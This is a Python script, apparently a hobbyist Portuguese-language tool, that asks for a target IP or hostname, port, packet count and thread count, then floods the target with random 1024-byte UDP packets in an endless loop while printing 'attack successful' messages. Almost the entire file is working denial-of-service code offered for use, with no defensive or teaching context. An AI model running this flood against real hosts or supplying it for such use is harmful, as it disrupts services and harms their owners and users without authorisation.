# ferramenta by fehzxkkj
import random
import sys
import socket
import threading
import ipaddress
import time
import os

os.system('clear')

print("\033[1m \033[96m  $                                             $")
print("  $$                                           $$")
print("  $$$$                                        $$$")
print("  $$ $$                                     $$ $$")
print("  $$  $$                                   $$  $$")
print("  $$ $ $$                                 $$ $ $$")
print("  $$  $  $                               $$ $  $$")
print("  $$   $  $$                            $  $   $$")
print("   $$   $$ $$                         $$  $   $$")
print("    $$   $$ $$                       $$ $$   $$$")
print("     $$   $$  $                     $$ $$    $$")
print("      $$   $$  $$                  $  $$   $$$")
print("       $$    $$ $$               $$ $$$    $$")
print("        $$    $$ $$             $$ $$    $$$")
print("         $$    $$  $$          $  $$    $$$")
print("          $$     $$ $$       $$  $$    $$")
print("           $$     $$ $$     $$ $$     $$")
print("             $$    $$  $$  $  $$    $$$")
print("              $$$    $$ $$$ $$$   $$$")
print("                $$$   $$  $$$   $$$$")
print("                  $$$   $$ $$  $$$")
print("                    $$$  $$ $$$$")
print("                    $ $$$  $$ $$   $$$$$$")
print("         $$$$$$$$ $$ $$ $$  $$ $$$$$$$$ $$")
print("        $$ $$$$$$$$ $$ $$$$$  $$$$$$  $$ $$")
print("        $$$$   $$$$$  $$   $$$$$$$$$$  $$$$")
print("             $$$$$$$$$       $$$$$ $$$")
print("           $$$ $ $$$$$      $$$ $$$ $$$$")
print("          $$$ $ $$  $$$     $$$  $$$  $$$")
print("         $$ $$ $$  $$ $     $ $$  $$ $ $$$")
print("       $$$ $ $$$  $$ $$     $$ $   $$ $$ $$$")
print("      $$ $$ $$$    $$$       $$$     $$ $ $$$$")
print(" $$$$$$ $ $$$                         $$ $$ $$$$$$")
print("$$    $$ $$$                            $$ $$    $")
print("$$     $$$$                              $$     $$")
print(" $$$    $$                               $    $$$")
print("  $$$$  $$                               $$$$$$$")
print("    $$$$$                                 $$$")

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def run(ip_run, port_run, times_run):
    data_run = random._urandom(1024)
    i = random.choice(("[*]", "[✓]", "[*]"))
    try:
        while True:
            print(f"\033[1m \033[96m{i} \033[97mAtaque Udp Com Sucesso {ip_run}:{port_run}!")
            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr_run = (str(ip_run), int(port_run))

            for x_run in range(times_run):
                s_run.sendto(data_run, addr_run)
            s_run.close()

        return

    except Exception as e:
        sys.exit(f"\033[1;37m{e}\033[0m.")

def main():
    print("\n")

    target = input("\033[1m \033[96m[x] IP (Númerico): ")
    print("")
    if not target.strip() or (not is_valid_ipv4(target) and target.replace('.', '').isdigit()):
        print("Número De Ip Inválido.")
        print("")
        sys.exit(1)
        
    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            print("Sucesso! ")
            print("")
        except socket.error as e:
            print("Erro ao resolver o alvo: {}".format(e))
            print("")
            sys.exit(1)
    else:
        ip = target

    while True:
        try:
            port = int(input("\033[1m \033[96m[x] Porta: "))
            print("")
            break
        except ValueError:
            print("Porta Inválida")
            print("")

    while True:
        try:
            times_input = input("\033[1m \033[96m[x] Time: ")
            print("")
            if times_input.strip():  
                times = int(times_input)
                break
            else:
                print("Número De Packets Inválido.")
                print("")
        except ValueError:
            print("Número De Packets Inválido.")
            print("")

    while True:
        try:
            threads_input = input("\033[1m \033[96m[x] Threads: ")
            if threads_input.strip():
                threads = int(threads_input)
                break
            else:
                print("Número De Threads Inválido.")
                print("")
        except ValueError:
            print("Número De Threads Inválido.")
            print("")

    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    error_occurred = False
    
    try:
        for y in range(threads):
            th = threading.Thread(target=run, args=(ip, port, times))
            th.start()
            th.join() 
    except KeyboardInterrupt:
        sys.exit("[-] Cancelado pelo usuário.")

if __name__ == "__main__":
    main()
